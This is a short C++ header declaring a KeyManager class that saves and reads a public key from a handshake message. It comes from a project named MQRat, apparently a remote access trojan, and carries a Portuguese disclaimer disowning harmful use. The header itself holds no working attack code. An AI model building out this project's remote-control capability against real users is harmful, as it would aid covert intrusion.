/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef KEYMANAGER_HPP
#define KEYMANAGER_HPP

#include <string>

/**
 * @brief The key manager class
 * 
 */
class KeyManager {
    public:
		KeyManager();
        void SavePublicKey(std::string handshake_message);
        std::string ReadPublicKey();
		std::string GetFilename();
	private:
		std::string filename;
		std::string pk;
};

#endif
